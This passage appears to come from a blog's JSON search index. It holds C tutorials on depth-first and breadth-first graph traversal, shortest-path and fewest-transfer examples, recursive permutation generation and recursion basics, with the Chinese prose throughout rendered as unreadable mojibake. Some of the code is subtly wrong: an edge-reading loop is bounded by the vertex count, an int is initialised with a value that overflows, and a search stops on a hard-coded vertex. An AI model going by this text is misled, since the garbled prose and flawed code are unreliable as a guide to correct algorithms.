èƒ½åˆ°è¾¾çš„å…¶ä»–é¡¶ç‚¹ï¼Œè¿™æ ·å°±æ¥åˆ°äº†é¡¶ç‚¹ 4ã€‚åˆ°äº†é¡¶ç‚¹ 4ï¼Œå‘ç°æ²¡æœ‰å…¶ä»–é¡¶ç‚¹å¯ä»¥åˆ°è¾¾ï¼Œäºæ˜¯é¡¶ç‚¹ä½ç½®å°±é€ä¸€åé€€ï¼Œåˆé€€åˆ°äº†æœ€å¼€å§‹çš„é¡¶ç‚¹ 1ï¼Œç„¶åä»é¡¶ç‚¹ 3 å¼€å§‹å°è¯•éå†ã€‚ç›´åˆ°æ‰€æœ‰çš„é¡¶ç‚¹èµ°è¿‡äº†ï¼Œéå†å°±ç»“æŸã€‚\nåœ¨å†™ä»£ç ä¹‹å‰ï¼Œè¦å…ˆè§£å†³ä¸€ä¸‹å¦‚ä½•å‚¨å­˜å›¾çš„é—®é¢˜\næœ€å¸¸ç”¨çš„æ–¹å¼æ˜¯ç”¨ä¸€ä¸ªäºŒç»´æ•°ç»„å‚¨å­˜å›¾çš„é‚»æ¥çŸ©é˜µï¼ˆå…·ä½“è¯·è‡ªè¡Œç™¾åº¦\nåœ¨é‚»æ¥çŸ©é˜µä¸­ï¼Œä¾‹å¦‚ a[i][j]=1 åˆ™è¯´æ˜ä»é¡¶ç‚¹ i åˆ°é¡¶ç‚¹ j æœ‰ä¸€æ¡è¾¹ï¼Œä¸º0åˆ™è¡¨ç¤ºæ— è¾¹ä¸å¯è¾¾\nç”±äºè¿™é‡Œç”¨çš„æ— å‘å›¾ï¼Œé‚£ä¹ˆé‚»æ¥çŸ©é˜µæ˜¯å…³äºå¯¹è§’çº¿å¯¹ç§°çš„\nä¸‹é¢æ˜¯åŸºäºæ·±åº¦ä¼˜å…ˆæ€æƒ³å¯¹å›¾éå†çš„ä»£ç ğŸ‘‡\n#include\u0026lt;stdio.h\u0026gt;\tint a[51][51];\rint book[51];//ç”¨äºæ ‡è®°\rint sum = 0;\rint n, m;\rvoid dfs(int cur)\r{\rint i;\rprintf(\u0026#34;%d \u0026#34;, cur);//æ‰“å°éå†ç‚¹çš„ç¼–å·\rsum++;\rif (sum == n)\rreturn;\rfor (int i = 1; i \u0026lt;= n; i++)\r{\rif (a[cur][i] == 1 \u0026amp;\u0026amp; book[i] != 1)\r{\rbook[i] = 1;\rdfs(i);\r}\r}\rreturn;\r}\rint main()\r{\rscanf_s(\u0026#34;%d %d\u0026#34;, \u0026amp;n, \u0026amp;m);\rfor (int i = 1; i \u0026lt;= n; i++)\r{\rfor (int j = 1; j \u0026lt;= n; j++)\r{\rif (i == j)\ra[i][j] = 0;//æ— å‘å›¾ï¼Œæ²¡æœ‰è‡ªå›ç‚¹\relse\ra[i][j] = 999999;\r}\r}\rfor (int i = 1; i \u0026lt;= n; i++)\r{\rint x, y;\rscanf_s(\u0026#34;%d %d\u0026#34;, \u0026amp;x, \u0026amp;y);\ra[x][y] = 1;\ra[y][x] = 1;\r}\rbook[1] = 1;\rdfs(1);\rreturn 0;\r} å¯ä»¥è¾“å…¥ä¸€ä¸‹æ•°æ®è¿›è¡ŒéªŒè¯ï¼š\n5 5\r1 2\r1 3\r1 5\r2 4\r3 5\rè¿è¡Œç»“æœä¸ºï¼š1 2 4 3 5 ç”¨å›¾æ¥è¡¨ç¤ºå°±æ˜¯è¿™æ ·\nå¹¿åº¦ä¼˜å…ˆçš„å…·ä½“è¿‡ç¨‹ #\rä½¿ç”¨å¹¿åº¦ä¼˜å…ˆæœç´¢æ–¹å¼æ¥éå†çš„è¿‡ç¨‹ï¼š\né¦–å…ˆä»¥ä¸€ä¸ªæœªè®¿é—®è¿‡çš„ç‚¹ä½œä¸ºèµ·ç‚¹ï¼Œæ¯”å¦‚é¡¶ç‚¹ 1ï¼Œå°† 1 å·æ”¾å…¥é˜Ÿåˆ—ï¼Œç„¶åå°†äº 1 å·ç›¸é‚»ä¸”ä¸ºè®¿é—®è¿‡çš„ç‚¹ä¾æ¬¡æ”¾å…¥é˜Ÿåˆ—ä¸­ï¼Œå¦‚ä¸‹å›¾ğŸ‘‡\næ¥ä¸‹æ¥å†å°†é¡¶ç‚¹ 2 ç›¸é‚»ä¸”æœªè¢«è®¿é—®è¿‡çš„é¡¶ç‚¹ 4æ”¾å…¥é˜Ÿåˆ—ï¼Œåˆ°æ­¤æ‰€æœ‰ç‚¹éƒ½è¢«è®¿é—®äº†\nå½“ç„¶ï¼Œè¿™é‡Œåªè®°å½•é¡¶ç‚¹çš„è®¿é—®é¡ºåºï¼Œå¦‚æœè¦è¿ç”¨åˆ°å®é™…é—®é¢˜ï¼Œè¿˜å¾—åŠ ä¸Šä¸€äº›æ•°æ®ï¼ˆè¿™é‡Œä¸å±•å¼€ï¼Œå‰é¢æ–‡ç« å†™è¿‡äº†\nä»£ç å®ç°å¦‚ä¸‹ğŸ‘‡\n#include\u0026lt;stdio.h\u0026gt;\tint n, m;\rint a[51][51];\rint book[51]={0};\rint que[10000], head, tail;\rint main()\r{\rscanf_s(\u0026#34;%d %d\u0026#34;, \u0026amp;n, \u0026amp;m);\rfor (int i = 1; i \u0026lt;= n; i++)\r{\rfor (int j = 1; j \u0026lt;= n; j++)\r{\rif (i == j)\ra[i][j] = 0;\relse\ra[i][j] = 999999;\r}\r}//åˆå§‹åŒ–ä¸€ä¸‹å›¾\rfor (int i = 1; i \u0026lt;= m; i++)\r{\rint x, y;\rscanf_s(\u0026#34;%d %d\u0026#34;, \u0026amp;x, \u0026amp;y);\ra[x][y] = 1;\ra[y][x] = 1;\r}\rhead = 1, tail = 1;\rque[tail] = 1;\rtail++;//é˜Ÿåˆ—åˆå§‹åŒ–\rbook[1] = 1;\rwhile (head \u0026lt; tail\u0026amp;\u0026amp; tail \u0026lt;=n)\r{\rint cur = que[head];\rfor (int i = 1; i \u0026lt;= n; i++)\r{\rif (a[cur][i] == 1 \u0026amp;\u0026amp; book[i] == 0)\r{\tque[tail] = i;\rtail++;\rbook[i] = 1;\r}\rif (tail \u0026gt; n)\r{\rbreak;\r}\r}\rhead++;\r}\rfor (int i = 1; i \u0026lt;tail; i++)\r{\rprintf(\u0026#34;%d \u0026#34;, que[i]);\r}\r} æ•°æ®éªŒè¯ï¼š\n5 5\r1 2\r1 3\r1 5\r2 4\r3 5\rè¿è¡Œç»“æœï¼š1 2 3 5 4 åŸå¸‚åœ°å›¾-å›¾çš„æ·±åº¦ä¼˜å…ˆéå† #\rç›´æ¥æ¥ä¾‹å­ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªæœ‰å‘å›¾\nè®°å½•äº†åŸå¸‚çš„è·¯çº¿ä»¥åŠè·ç¦»\nè¦æ±‚ä»é¡¶ç‚¹ 1 åˆ°é¡¶ç‚¹ 5 çš„æœ€çŸ­è·ç¦»\nè¿™ä¸ªç”±äºè·¯çº¿æ¯”è¾ƒå°‘ï¼Œçœ‹å‡ çœ¼å°±èƒ½å‡ºæ¥ï¼Œä½†å®é™…ä¸ŠçœŸå®çš„åœ°å›¾ä¼šæ›´å¤æ‚\né‚£ä¹ˆåœ¨è¿™é‡Œä½¿ç”¨æ·±åº¦ä¼˜å…ˆæœç´¢æ–¹å¼æ¥æ‰¾å‡ºæœ€çŸ­è·¯å¾„\nä»£ç ğŸ‘‡\n#include\u0026lt;stdio.h\u0026gt;\tint a[51][51];\rint book[51];\rint n, m;\rint min = 99999999999;\rvoid dfs(int cur,int dis)\r{\rif (dis \u0026gt; min)\rreturn;\rif (cur == n)\r{\rif (dis \u0026lt; min)\rmin = dis;\rreturn;\r}\rfor (int i = 1; i \u0026lt;=n; i++)\r{\rif (a[cur][i] != 99999999 \u0026amp;\u0026amp; book[i] == 0)\r{\rbook[i] = 1;\rdfs(i,a[cur][i]+dis);\rbook[i] = 0;\r}\r}\rreturn;\r}\rint main()\r{\rscanf_s(\u0026#34;%d %d\u0026#34;, \u0026amp;n, \u0026amp;m);\rfor (int i = 1; i \u0026lt;=n; i++)\r{\rfor (int j = 1; j \u0026lt;= n; j++)\r{\rif (i == j)\ra[i][j] = 0;\relse\ra[i][j] = 99999999;\r}\r}//åˆå§‹åŒ–å›¾\rfor (int i = 1; i \u0026lt;= m; i++)\r{\rint x, y,d;\rscanf_s(\u0026#34;%d %d %d\u0026#34;, \u0026amp;x, \u0026amp;y,\u0026amp;d);\ra[x][y] = d;//æœ‰å‘å›¾çš„å†™æ³•\r}\rdfs(1,0);\rprintf(\u0026#34;%d \u0026#34;, min);\rreturn 0;\r} ç”±äºæ˜¯æœ‰å‘å›¾ï¼Œé‚£ä¹ˆé‚»æ¥çŸ©é˜µè‚¯å®šå°±ä¸æ˜¯å¯¹ç§°çš„äº†\nå¯ä»¥å°†æ•°ç»„ä¸‹æ ‡ä½œä¸ºä¸¤ç‚¹ï¼Œå€¼ä½œä¸ºè·ç¦»\næœ€å°‘è½¬æœº-å›¾çš„å¹¿åº¦ä¼˜å…ˆéå† #\rè¿™æ˜¯ä¸€ä¸ªæ— å‘å›¾\nå‡å¦‚è¦ä»é¡¶ç‚¹ 1 é£åˆ°é¡¶ç‚¹ 5ï¼Œè¦æ±‚æœ€å°‘è½¬æœºæ¬¡æ•°çš„è·¯çº¿\nç”±äºä¸æ¶‰åŠåˆ°è¾¹çš„é•¿åº¦ï¼Œåªæ˜¯æ¶‰åŠåˆ°è¾¹çš„ä¸ªæ•°\né‚£ä¹ˆå°è¯•ä½¿ç”¨å¹¿åº¦ä¼˜å…ˆæœç´¢æ–¹å¼æ¥è§£å†³è¿™ä¸ªé—®é¢˜\nä»£ç ğŸ‘‡\n#include\u0026lt;stdio.h\u0026gt;\tint n, m;\rint a[51][51];\rint head, tail;\rint book[51];\rstruct note\r{\rint x;//ç¼–å·\rint times;//æ¬¡æ•°\r};\rstruct note que[100001];\rint main()\r{\rint flag = 0;\rint start, end;\rscanf_s(\u0026#34;%d %d %d %d\u0026#34;, \u0026amp;n, \u0026amp;m,\u0026amp;start,\u0026amp;end);\rfor (int i = 1; i \u0026lt;= n; i++)\r{\rfor (int j = 1; j \u0026lt;= n; j++)\r{\rif (i == j)\ra[i][j] = 0;\relse\ra[i][j] = 999999;\r}\r}//åˆå§‹åŒ–æ•°ç»„\rfor (int i = 1; i \u0026lt;= m; i++)\r{\rint x, y;\rscanf_s(\u0026#34;%d %d\u0026#34;, \u0026amp;x, \u0026amp;y);\ra[x][y] = 1;\ra[y][x] = 1;\r}\rhead = 1, tail = 1;\rque[tail].x = start;\rbook[start] = 1;\rtail++;\rwhile (head \u0026lt; tail)\r{\rfor (int i = 1; i \u0026lt;= n; i++)\r{\rif (a[que[head].x][i] == 1 \u0026amp;\u0026amp; book[i] == 0)\r{\rque[tail].x = i;\rque[tail].times = que[head].times + 1;\rtail++;\rbook[i] = 1;\r}\rif (que[tail - 1].x == 5)\r{\rflag = 1;\rbreak;\r}\r}\rif (flag ==1)\rbreak;\rhead++;\r}\rprintf(\u0026#34;%d \u0026#34;, que[tail - 1].times);\rreturn 0;\r} æ•°æ®æµ‹è¯•ğŸ‘‡\n5 7 1 5\r1 2\r1 3\r2 3\r2 4\r3 4\r3 5\r4 5\rè¿è¡Œç»“æœï¼š2 å½“ç„¶ä¹Ÿå¯ä»¥ä½¿ç”¨æ·±åº¦ä¼˜å…ˆæœç´¢è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œä½†æ˜¯åœ¨è¿™é‡Œç”¨å¹¿åº¦ä¼˜å…ˆæœç´¢ä¼šæ›´å¿«\nå¹¿åº¦ä¼˜å…ˆæœç´¢æ›´é€‚ç”¨äºæ‰€æœ‰è¾¹çš„æƒå€¼ç›¸åŒçš„æƒ…å†µ\n**æ€»ç»“ï¼š**è¿™ç¯‡æ–‡ç« ä¸»è¦è¿˜æ˜¯å›´ç»•æ·±åº¦ä¸å¹¿åº¦ä¸¤ç§æœç´¢æ–¹å¼ï¼Œç»“åˆå›¾è®ºçš„ç›¸å…³çŸ¥è¯†ï¼Œæ¥è§£å†³ä¸€äº›å®é™…è¿ç”¨çš„é—®é¢˜\nä¸è¿‡è¿˜æ˜¯å­˜åœ¨ä¸€äº›å°ç–‘é—®ï¼šå¦‚ä½•è®°å½•æœ€çŸ­è·¯å¾„æˆ–è€…æœ€å°‘è½¬æœºè¿™ç§çš„è·¯çº¿ï¼Ÿå¦‚æœå¼€æ•°ç»„çš„è¯ï¼Œç”±äºè·¯çº¿çš„æœªçŸ¥æ€§ï¼Œå¯èƒ½ä¼šé€ æˆæ•°ç»„ä¼šæ•´çš„å¾ˆå¤§ï¼ˆä¸ªäººçŒœæƒ³ï¼‰\nkeep moving\n","date":"2023-07-15","externalUrl":null,"permalink":"/posts/2023/07/graph-traversal/","section":"Posts","summary":"","title":"å›¾çš„éå†","type":"posts"},{"content":"\rå‰è¨€ #\råœ¨è¯´æœç´¢æ–¹å¼ä¹‹å‰\nå…ˆè®²ä¸€ä¸ªç®€å•çš„é—®é¢˜ï¼šæ±‚æ•°çš„å…¨æ’åˆ—\næ¯”å¦‚è¯´ï¼Œ123 çš„å…¨æ’åˆ—å°±æ˜¯ï¼š123ã€132ã€213ã€231ã€312ã€321\nè¿™å¾ˆç®€å•å§\nå…¨æ’åˆ—çš„ä¸ªæ•°å°±æ˜¯è¿™ä¸ªæ•°çš„ä½æ•°çš„é˜¶ä¹˜ï¼Œå³ 123 çš„å…¨æ’åˆ—çš„ä¸ªæ•°æ˜¯ ï¼ˆ 3ï¼=3Ã—2Ã—1ï¼‰\nå‡å¦‚è¦ç”¨ C è¯­è¨€æ¥å†™å‘¢ï¼Ÿ\nåº”è¯¥å¾ˆå¿«å°±èƒ½æƒ³åˆ°ï¼Œ3ä¸ªforå¾ªç¯å˜›\nåˆ†åˆ«æ§åˆ¶ä½ä¸Šçš„æ•°å­—ä¸é‡å¤å°±è¡Œäº†\né‚£ä¹ˆå‡å¦‚æ•°å­—æ›´å¤§ä¸€ç‚¹å‘¢ï¼Ÿ\næ¯”å¦‚è¯´ 123456789\nä¸€å…±ä¹ä½ï¼Œé‚£ä¹ˆè¿™ä¸ªæ•°çš„å…¨æ’åˆ—çš„ä¸ªæ•°å°±æ˜¯ ï¼ˆ 9ï¼= 362880ï¼‰\nå®é™…ä¸Šè¿™ä¸ªæ•°å­—çš„å…¨æ’åˆ—æ˜¯èƒ½ç”¨ 9 ä¸ªforå¾ªç¯å†™å‡ºæ¥\nä¸è¿‡é‚£æ ·çœ‹ç€æ˜¯ååˆ†è‡ƒè‚¿éº»çƒ¦çš„\nä¸‹é¢å°±é€šè¿‡å­¦ä¹ ä¸€ä¸‹æ·±åº¦æœç´¢ï¼Œæ¥ç»™è¿™æ ·çš„é—®é¢˜å¯»æ‰¾ä¸€ä¸‹æ–°çš„æ€è·¯å§\næ·±åº¦ä¼˜å…ˆæœç´¢ #\rç®€å•çš„è¯´å°±æ˜¯ä¸€æ¡è·¯èµ°åˆ°åº•ï¼Œç¢°å£å†é€€å›æ‰¾å…¶ä»–è·¯\nå…ˆç”¨ 123 çš„å…¨æ’åˆ—æ¥ä¸¾ä¸ªä¾‹å­\nå…ˆå¼€ä¸€ä¸ªæ•°ç»„å˜›ï¼Œint num[10]ï¼ˆæ–¹ä¾¿ç†è§£ï¼Œè¿™é‡Œå°±ä¸ç”¨0ä¸‹æ ‡äº†ï¼‰\n**å…ˆä»ç¬¬ä¸€ä¸ªæ ¼å­ï¼ˆnum[1]ï¼‰å¼€å§‹ï¼š**èƒ½æ”¾å…¥çš„æ•°å­—æœ‰ä¸‰ä¸ª,åˆ†åˆ«ä¸º1ï¼Œ2ï¼Œ3\n**èµ°åˆ°ç¬¬äºŒä¸ªæ ¼å­ï¼š**èƒ½æ”¾å…¥çš„å‰©ä¸‹ä¸¤ä¸ªï¼Œå¦‚æœå‰é¢æ”¾äº†1ï¼Œé‚£ä¹ˆç°åœ¨èƒ½æ”¾2ï¼Œ3\n**èµ°åˆ°ç¬¬ä¸‰ä¸ªæ ¼å­ï¼š**èƒ½æ”¾çš„åªå‰©ä¸‹ä¸€ä¸ªäº†\n**æœ€åèµ°åˆ°ç¬¬å››ä¸ªæ ¼å­ï¼š**å“¦ï¼Ÿç°åœ¨æ‰‹é‡Œæ²¡æ•°å­—äº†ï¼Œé‚£å°±è¯´æ˜ä¸€ä¸ªæ’åˆ—ç»„åˆå·²ç»å½¢æˆ\nè¿™ä¸ªæ—¶å€™ä½ è¦å½¢æˆä¸€ä¸ªæ–°çš„æ’åˆ—ç»„åˆï¼Œæœ€ç®€å•çš„æ–¹å¼æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ\næ²¡é”™ï¼Œæ‹¿èµ·ç¦»ä½ æœ€è¿‘çš„æ•°å­—ï¼Œå¾€åé¢é€€ï¼Œçœ‹æ˜¯å¦æœ‰èƒ½äº¤æ¢é¡ºåºçš„æ•°å­—\nï¼ˆè¿™ä¹Ÿåº”è¯¥æ˜¯é«˜ä¸­æ•°å­¦æ±‚æ’åˆ—ç»„åˆçš„ä¸€ç§åŸºæœ¬æ–¹å¼äº†\næœ‰äº†è¿™ä¸ªæ€æƒ³ï¼Œæˆ‘ä»¬å°è¯•å°†å…¶è½¬åŒ–ä¸ºä»£ç å®ç°ğŸ‘‡\n#include\u0026lt;stdio.h\u0026gt;\tint num[10];//å„ä¸ªä½ä¸Šçš„æ•°å­—ï¼Œé»˜è®¤ä¸ºé›¶\rint hand[10];//æ‰‹ä¸­çš„ç‰Œ,ä¸‹æ ‡å¯¹åº”æ•°å­—ï¼Œå€¼0å°±æ˜¯æœ‰ï¼Œ1å°±æ˜¯æ²¡æœ‰\rint n;\rvoid func(int count)//cntè¡¨ç¤ºç«™åœ¨ç¬¬å‡ ä¸ªç›’å­é¢å‰\r{\rif (count == n + 1)//å‡å¦‚èµ°åˆ°æœ€åä¸€ä½çš„å¤–é¢å»äº†ï¼Œé‚£ä¹ˆè¯´æ˜æ’åˆ—å®Œæ¯•\r{\rfor (int i = 1; i \u0026lt;=n; i++)\r{\rprintf(\u0026#34;%d\u0026#34;, num[i]);\r}\rprintf(\u0026#34;\\n\u0026#34;);\rreturn; }\rfor (int i = 1; i \u0026lt;= n; i++)\r{\rif (hand[i] == 0)//æ‰‹ä¸Šæœ‰è¿™å¼ ç‰Œï¼Œå°±æ”¾è¿›å»\r{\rnum[count] = i;\rhand[i] = 1;\r//æ¥ç€è¿›å…¥ä¸‹ä¸€ä¸ªç›’å­\rfunc(count + 1);//é€’å½’\rhand[i] = 0;//funcåœ¨returnä¹‹åå°†æ ¼å­é‡Œçš„æ•°å­—è¦æ‹¿å‡ºæ¥ï¼Œè¿™æ­¥å¾ˆé‡è¦\r}\r}\rreturn;\r}\rint main()\r{\rscanf_s(\u0026#34;%d\u0026#34;, \u0026amp;n);\rfunc(1);\rreturn 0;\r} å‡å¦‚æˆ‘ä»¬è¾“å…¥ä¸€ä¸ª5ï¼Œ\né‚£ä¹ˆè¿è¡Œç»“æœå°±æ˜¯è¿™æ ·çš„ğŸ‘‡\nå…·ä½“æ¥çœ‹çœ‹ä»£ç å§ï¼Œï¼ˆå‡å¦‚è¦ç”¨forå¾ªç¯çš„è¯ï¼Œä¼°è®¡ä½ è¿˜æ²¡æ•²åˆ°ä¸€åŠï¼Œæˆ‘å·²ç»æ•²å®Œäº†ğŸ‘Œ\nè¿™æ®µä»£ç çš„æ ¸å¿ƒå°±åœ¨äºé€’å½’ï¼ˆè‡ªå·±è°ƒç”¨è‡ªå·±\nå¥½äº†ï¼ˆè¿™ä¸€å¥è¯éš”ç€ä¸Šä¸€å¥è¯å·²ç»åå¤šåˆ†é’Ÿäº†ï¼Œä¸€ç›´åœ¨ç»„ç»‡è¯­è¨€å¦‚ä½•æ›´å‡†ç¡®çš„è¡¨è¾¾æ•´ä¸ªè¿‡ç¨‹ğŸ˜‚\n5 ä½æ•°ä¸å¤ªå¥½è¡¨è¾¾ï¼Œè¿™é‡Œè¿˜æ˜¯ç”¨ 3 ä½æ•° 123 æ¥åˆ†æä¸€ä¸‹åŸç†\n123 æ˜¯å¦‚ä½•é‡æ–°æ’åˆ—ä¸º 132çš„ï¼Ÿä»¥åŠé€’å½’åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­èµ·åˆ°çš„ä½œç”¨ï¼š\nå‡å¦‚æˆ‘ä»¬è¦æ±‚çš„æ˜¯ 123 çš„å…¨æ’åˆ—ï¼Œä½¿ç”¨ä¸Šé¢çš„ä»£ç ï¼Œè¿›è¡Œé€å±‚åˆ†æ\né¦–å…ˆæœ‰è‡³å°‘4ä¸ªæ ¼å­å­\næˆ‘ä»¬ä»ç¬¬ä¸€ä¸ªæ ¼å­å¼€å§‹ï¼Œæœ‰ä¸€ä¸ªä» 1 åˆ° 3 çš„ 3 æ¬¡å¾ªç¯ï¼Œé€‰å–æ‰‹ä¸­æœ‰çš„ç‰Œå¹¶ä¸”æ”¾å…¥æ ¼å­ï¼Œç„¶åç«‹é©¬è¿›å…¥ç¬¬äºŒä¸ªæ ¼å­ï¼Œè¿™æ—¶ï¼ˆç¬¬ä¸€ä¸ªæ ¼å­çš„å¾ªç¯æ˜¯ä»ç„¶å­˜åœ¨çš„ï¼Œåªæ˜¯åœç•™åœ¨äº† 1 ï¼‰\nåˆ°äº†ç¬¬äºŒä¸ªæ ¼å­ï¼Œåˆæ˜¯ä¸€ä¸ªä» 1 åˆ° 3 çš„ 3 æ¬¡å¾ªç¯ï¼Œé‡å¤ä¸Šé¢çš„æ“ä½œï¼Œç„¶åè¿›å…¥ç¬¬ä¸‰ä¸ªæ ¼å­\nè¿›å…¥äº†ç¬¬ä¸‰ä¸ªæ ¼å­ï¼Œè¿˜æ˜¯æœ‰ä¸€ä¸ª 3 æ¬¡å¾ªç¯ï¼Œå¦‚æœæ˜¯ç¬¬ä¸€æ¬¡å½¢æˆæ’åˆ—ï¼ˆ123ï¼‰\nï¼Œé‚£ä¹ˆå¾ªç¯ä» 1 åˆ° 3 ï¼Œåœ¨3çš„æ—¶å€™åˆšå¥½ç»“æŸï¼Œç„¶åèµ°åˆ°äº†ç¬¬å››ä¸ªæ ¼å­ï¼Œå®Œæˆä¸€æ¬¡æ’åˆ—\nå…³é”®ç‚¹æ¥äº†ï¼Œç”±äºè¿™æ˜¯ä¸€ä¸ªé€’å½’è¿‡ç¨‹ï¼Œå®Œæˆæ’åˆ—åæ‰‹é‡Œä¼šæ”¶å›ç›¸åº”æ ¼å­ä½¿ç”¨è¿‡çš„ç‰Œ\næ­¤æ—¶ï¼Œç¬¬ä¸‰ä¸ªæ ¼å­çš„å¾ªç¯å·²ç»ç»“æŸï¼Œä½†æ˜¯ç¬¬äºŒä¸ªæ ¼å­çš„å¾ªç¯è¿˜æ²¡ç»“æŸå‘¢\nç¬¬ä¸€ä¸ªæ’åˆ—çš„æ—¶å€™ï¼Œç¬¬äºŒä¸ªæ ¼å­çš„å¾ªç¯åˆšå¥½èµ°åˆ° 2 æ˜¯å§ï¼Œæ¥ä¸‹æ¥å°±æ˜¯ç¬¬ä¸‰æ¬¡å¾ªç¯ï¼ˆ2æ˜¯è¢«æ”¶å›äº†çš„ï¼‰ï¼Œç”±äºç¬¬ä¸‰ä¸ªæ ¼å­åˆšå¥½æ”¶å›äº†æ•°å­— 3ï¼Œé‚£ä¹ˆç¬¬äºŒä¸ªæ ¼å­å°±æ”¾è¿›å» 3 ï¼Œæ ¹æ®ä»£ç ï¼Œèƒ½æ”¾è¿›å»å°±ä¼šç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªæ ¼å­ï¼Œå¹¶ä¸”å¼€å¯æ–°çš„å¾ªç¯é€‰æ‹©ï¼Œç¬¬ä¸‰ä¸ªæ ¼å­åˆšå¥½é€‰åˆ° 2 ï¼Œé‚£ä¹ˆå°±å½¢æˆäº†æ–°çš„æ’åˆ—ï¼ˆ132ï¼‰\nå¯èƒ½ä¼šæœ‰ç–‘é—®ï¼Œå¼€å¯ç¬¬ä¸‰ä¸ªæ ¼å­çš„æ–°å¾ªç¯æ—¶ï¼Œä¸ºä»€ä¹ˆæ²¡æœ‰é€‰æ‹©åˆ° 1 ï¼Ÿ\nç­”ï¼šä»”ç»†è§‚å¯Ÿä»£ç ï¼Œåœ¨å¾ªç¯ä¸­ï¼Œæ‹¿å›æ‰‹ç‰Œçš„æ—¶é—´åœ¨åä¸€ä¸ªæ ¼å­æ‰§è¡Œå®Œæ¯•ä¹‹åï¼Œç¬¬äºŒä¸ªæ ¼å­å¼€å§‹åªè¿›è¡Œäº†ç¬¬äºŒæ¬¡å¾ªç¯é€‰æ‹©äº†2ï¼Œå‰©äº†ä¸€æ¬¡å¾ªç¯ï¼Œç¬¬äºŒä¸ªæ ¼å­é€‰æ‹©å®Œ 2 åç”±äºå¾ªç¯å¹¶æ²¡æœ‰ç»“æŸï¼Œæ‰€ä»¥å¹¶æ²¡æœ‰returnå›åˆ°ç¬¬ä¸€ä¸ªæ ¼å­é‚£é‡Œï¼Œä¹Ÿå°±æ˜¯ç¬¬äºŒä¸ªæ ¼å­çš„funcå‡½æ•°æ²¡æœ‰æ‰§è¡Œå®Œæ¯•ï¼Œå› æ­¤ç¬¬ä¸€ä¸ªæ ¼å­ä¸­çš„ 1 æ˜¯ä¸ä¼šè¢«æ”¶å›çš„ã€‚\nï¼ˆæ·±å¸ä¸€å£æ°”ï¼‰ğŸ˜«\nå…¶å®è¿™ä¸ªä»£ç çš„æ ¸å¿ƒè¡Œä¹Ÿä¸è¿‡ 20 è¡Œï¼Œå´é¥±å«æ·±åº¦ä¼˜å…ˆæœç´¢çš„åŸºæœ¬æ¨¡å‹\næœ¬è´¨ä¸Šè¿˜æ˜¯ä¾èµ–å¾ªç¯ï¼Œåªä¸è¿‡å‡å°‘äº†è®¸å¤šä¸å¿…è¦çš„éå†\nç†è§£çš„å…³é”®å°±åœ¨äºï¼šå½“ä¸‹åº”è¯¥æ€æ ·åšï¼Ÿä»¥åŠæ·±åº¦ä¼˜å…ˆè¿™ä¸ªè¯çš„æ¦‚å¿µ\nä¸€ä¸ªåŸºæœ¬çš„æ·±åº¦ä¼˜å…ˆæœç´¢çš„åŸºæœ¬æ¨¡å‹ğŸ‘‡\nvoid dfs(int step)\r{\r//åˆ¤æ–­è¾¹ç•Œ\rfor (int i = 1; i \u0026lt;= n; i++)//å°è¯•æ¯ä¸€ç§å¯èƒ½ {\r//ç»§ç»­ä¸‹ä¸€æ­¥\rdfs(step + 1);\r}\r//è¿”å›\r} è¯´ç‚¹é¢˜å¤–çš„ï¼Œé€’å½’è¿™ä¸ªä¸œè¥¿å¯èƒ½ç†è§£èµ·æ¥ä¼šæœ‰ç‚¹æŠ½è±¡\nè¿™é‡Œç®€å•çš„ä¸¾ä¸ªä¾‹å­ï¼Œç”¨äºç†è§£é€’å½’é€»è¾‘\n#include\u0026lt;stdio.h\u0026gt;\tint n;\rvoid func(int x)\r{\rif (x \u0026lt; n)\r{\rint t;\rscanf_s(\u0026#34;%d\u0026#34;, \u0026amp;t);\rfunc(x + 1);\rprintf(\u0026#34;%d\u0026#34;, t);\r}\rreturn;\r}\rint main()\r{\rscanf_s(\u0026#34;%d\u0026#34;, \u0026amp;n);\rfunc(0);\rreturn 0;\r} ä¸Šé¢è¿™æ®µä»£ç ï¼Œè¾“å…¥ä¸€ä¸ªæ•°å­—çš„é•¿åº¦ï¼Œç„¶åè¾“å…¥ç›¸åº”ä½æ•°ï¼Œç„¶åå€’åºæ‰“å°\nåªä¸è¿‡ç”¨äº†é€’å½’çš„æ€æƒ³\nå°±è¿™ä¸ªä¾‹å­è€Œè¨€ï¼Œscanfè¾“å…¥ï¼Œfuncé€’å½’è°ƒç”¨ï¼Œprintfæ‰“å°ï¼Œè¿™ä¸‰æ­¥æ˜¯æœ€å…³é”®çš„\nå…ˆè¿›å…¥funcï¼Œå½•å…¥ä¸€ä¸ªæ•°å­—ä¹‹åè¿›å…¥ä¸‹ä¸€ä¸ªä½ç½®ï¼Œæ­¤æ—¶printfçš„å‡½æ•°å°±è¢«æç½®ï¼Œç„¶åç»§ç»­å½•å…¥â€¦â€¦\nå¯ä»¥çœ‹ä½œè¿™æ ·ä¸€ä¸ªè¿‡ç¨‹ï¼šä»å·¦åˆ°å³æ¯ä¸€ä½éƒ½æ‰§è¡Œäº†funcå‡½æ•°ï¼Œä½†æ˜¯éƒ½æ²¡æœ‰æ‰§è¡Œå®Œæ¯•ï¼Œåªæœ‰æœ€åä¸€ä½å½•å…¥åï¼Œæ‰ä»æœ€åå¼€å§‹å€’ç€å¾€å‰ç»“æŸä¹‹å‰çš„å‡½æ•°\nç”¨ä»£ç æ¥çœ‹å¤§è‡´æ˜¯è¿™æ ·ğŸ‘‡\nscanf_s(\u0026#34;%d\u0026#34;, t1);\r{\rscanf_s(\u0026#34;%d\u0026#34;, t2);\r{\rscanf_s(\u0026#34;%d\u0026#34;, t3);\rprintf(\u0026#34;%d\u0026#34;, t3);\r}\rprintf(\u0026#34;%d\u0026#34;, t2);\r}\rprintf(\u0026#34;%d\u0026#34;, t1); å¯ä»¥çœ‹åˆ°è™½ç„¶ t1 æ˜¯æœ€æ—©å½•å…¥çš„ï¼Œä½†æ˜¯ç¡®å®æœ€æ™šæ‰“å°çš„ï¼Œ123ä¾¿å€’åºä¸º321\nèµ°è¿·å®« #\rå­¦ä¹ æœç´¢ï¼Œå°±ç¦»ä¸å¼€è¿·å®«\nç®€å•çš„æ¥è¯´è¿·å®«å°±æ˜¯ä¸€ä¸ªäºŒç»´æ•°ç»„ï¼Œç”¨æ•°å€¼æ¥åŒºåˆ†éšœç¢å’Œé“è·¯\nä¸Šé¢å·²ç»å­¦ä¹ 